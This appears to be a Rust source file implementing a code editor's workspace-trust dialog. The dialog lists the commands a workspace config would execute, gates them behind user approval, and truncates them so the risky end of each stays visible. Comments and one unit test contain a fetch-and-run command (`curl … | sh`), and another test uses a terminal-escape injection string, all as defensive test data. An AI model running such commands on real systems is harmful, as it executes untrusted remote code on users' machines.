//! App-side workspace-trust flow — the prompt, the grant, and the
//! restricted-mode state the statusline reads.
//!
//! The scan/store/fingerprint half lives in [`crate::workspace_trust`];
//! this file is only the UI and the re-load that follows a grant.

use super::*;

impl App {
    /// Startup hook — show the trust dialog when this workspace
    /// declares something executable that hasn't been approved at its
    /// current fingerprint.
    ///
    /// Silent in the common case: a workspace with no `.mnml/` (or one
    /// whose config is all ordinary keys) produces no claims and never
    /// prompts. That's what keeps the dialog meaningful when it does
    /// appear — unlike a prompt-on-every-folder model, where users
    /// learn to dismiss it reflexively.
    pub fn maybe_prompt_workspace_trust(&mut self) {
        let claims = crate::workspace_trust::scan(&self.workspace);
        if claims.is_empty() {
            self.workspace_trust_restricted = false;
            return;
        }
        let fp = crate::workspace_trust::fingerprint(&claims);
        if crate::workspace_trust::is_trusted(&self.workspace, &fp) {
            self.workspace_trust_restricted = false;
            return;
        }
        self.workspace_trust_restricted = true;
        self.pending_workspace_trust = Some((fp, claims));
        self.open_workspace_trust_prompt();
    }

    /// Build + show the dialog for the pending claim set. Split from
    /// `maybe_prompt_workspace_trust` so `workspace.review_trust` can
    /// reopen it later without redoing the gating logic.
    pub fn open_workspace_trust_prompt(&mut self) {
        let Some((_, claims)) = self.pending_workspace_trust.clone() else {
            return;
        };
        let ws_name = self
            .workspace
            .file_name()
            .map(|s| s.to_string_lossy().into_owned())
            .unwrap_or_else(|| self.workspace.display().to_string());

        // Show the actual commands, not a generic "do you trust the
        // authors" — a hostile `sh -c "curl …|sh"` is self-evident
        // where an abstract warning just trains people to click yes.
        let mut lines = vec![format!("{ws_name}/.mnml/ declares:"), String::new()];
        const MAX_SHOWN: usize = 6;
        for claim in claims.iter().take(MAX_SHOWN) {
            lines.push(format!(
                "  • {} · {}",
                claim.kind.label(),
                truncate_command(&claim.command)
            ));
            lines.push(format!("      runs {}", claim.kind.trigger()));
        }
        if claims.len() > MAX_SHOWN {
            lines.push(format!("  … and {} more", claims.len() - MAX_SHOWN));
        }
        lines.push(String::new());
        lines.push("Trust this workspace only if you know where it came from.".to_string());
        lines.push("Editing, git, and search work either way.".to_string());

        let mut prompt = crate::prompt::Prompt::new(
            crate::prompt::PromptKind::WorkspaceTrustConfirm,
            lines.join("\n"),
        );
        // Focus the SAFE button. The dangerous choice should never be
        // one reflexive Enter away.
        prompt.cursor = 1;
        self.prompt = Some(prompt);
    }

    /// User chose Trust — persist the decision at the current
    /// fingerprint, then re-materialise everything the gate suppressed
    /// so the workspace works without a restart.
    pub fn grant_workspace_trust(&mut self) {
        let Some((fp, _)) = self.pending_workspace_trust.take() else {
            return;
        };
        if let Err(e) = crate::workspace_trust::trust(&self.workspace, &fp) {
            self.toast(format!("could not record workspace trust: {e}"));
            return;
        }
        self.workspace_trust_restricted = false;

        // Re-load config with the workspace layer's exec keys now
        // honoured. Cheaper and far less error-prone than trying to
        // patch the individual keys back in by hand.
        let explicit = self.explicit_config_path.clone();
        self.config =
            crate::config::Config::load_with_trust(explicit.as_deref(), &self.workspace, true);
        // Integration manifests consult the trust store themselves, so
        // this picks up the workspace dir now that it's recorded.
        self.integration_manifests = crate::integration_manifest::load_all(&self.workspace);

        self.toast(
            "Workspace trusted — its language servers, formatters, and integrations are active.",
        );
    }

    /// `workspace.review_trust` — reopen the dialog for the current
    /// workspace, or report status when there's nothing to decide.
    /// Also the click target for the restricted-mode statusline chip.
    pub fn review_workspace_trust(&mut self) {
        let claims = crate::workspace_trust::scan(&self.workspace);
        if claims.is_empty() {
            self.toast("This workspace declares nothing that mnml would run.");
            return;
        }
        let fp = crate::workspace_trust::fingerprint(&claims);
        if crate::workspace_trust::is_trusted(&self.workspace, &fp) {
            // Offer the inverse action when already trusted, so the
            // decision is reversible from the same entry point.
            if let Err(e) = crate::workspace_trust::revoke(&self.workspace) {
                self.toast(format!("could not revoke trust: {e}"));
                return;
            }
            self.workspace_trust_restricted = true;
            self.toast("Workspace trust revoked — restart mnml to drop its commands.");
            return;
        }
        self.pending_workspace_trust = Some((fp, claims));
        self.open_workspace_trust_prompt();
    }
}

/// Keep one claim on one dialog line, eliding the MIDDLE.
///
/// Both ends carry the signal and the middle rarely does. For a path
/// the basename is what identifies it (`claude-multi.sh`); for a shell
/// line the tail is where the payload hides (`… | sh`). Head-only
/// truncation threw away exactly the half a reader needs — the first
/// real dialog, against mnml's own manifest, rendered
/// `multi-repo: /Users/chrismclennan/Projects/tattle-cl…`, which says
/// nothing about what would actually run.
fn truncate_command(cmd: &str) -> String {
    const MAX: usize = 72;
    let clean: String = cmd
        .chars()
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect();
    let n = clean.chars().count();
    if n <= MAX {
        return clean;
    }
    // Bias slightly toward the tail: a long path's meaning is
    // concentrated in its last couple of segments.
    let tail_len = (MAX - 1) / 2 + (MAX - 1) % 2;
    let head_len = MAX - 1 - tail_len;
    let head: String = clean.chars().take(head_len).collect();
    let tail: String = clean.chars().skip(n - tail_len).collect();
    format!("{head}…{tail}")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn truncate_keeps_short_commands_verbatim() {
        assert_eq!(truncate_command("rust-analyzer"), "rust-analyzer");
    }

    #[test]
    fn truncate_marks_the_cut_and_bounds_the_width() {
        let long = "a".repeat(200);
        let out = truncate_command(&long);
        assert!(out.contains('…'));
        assert!(out.chars().count() <= 72);
    }

    #[test]
    fn truncate_keeps_the_basename_of_a_long_path() {
        // The regression this function was rewritten for: the real
        // dialog hid `claude-multi.sh`, the only part identifying what
        // would run.
        let p =
            "multi-repo: /Users/chrismclennan/Projects/tattle-claude-workspace/bin/claude-multi.sh";
        let out = truncate_command(p);
        assert!(
            out.contains("claude-multi.sh"),
            "basename must survive: {out}"
        );
        assert!(
            out.starts_with("multi-repo: /Users"),
            "head identifies it too: {out}"
        );
        assert!(out.chars().count() <= 72);
    }

    #[test]
    fn truncate_keeps_the_tail_of_a_piped_shell_line() {
        // The other signal-bearing end: a payload hides in the tail.
        let cmd = format!("curl https://{}.example.com/x | sh", "a".repeat(80));
        let out = truncate_command(&cmd);
        assert!(out.ends_with("| sh"), "pipe target must survive: {out}");
    }

    #[test]
    fn truncate_neutralizes_control_chars() {
        // A command carrying \r or an escape sequence must not be able
        // to rewrite the dialog around it.
        let out = truncate_command("evil\r\nTrusted: yes\x1b[2J");
        assert!(!out.contains('\r'));
        assert!(!out.contains('\n'));
        assert!(!out.contains('\x1b'));
    }
}
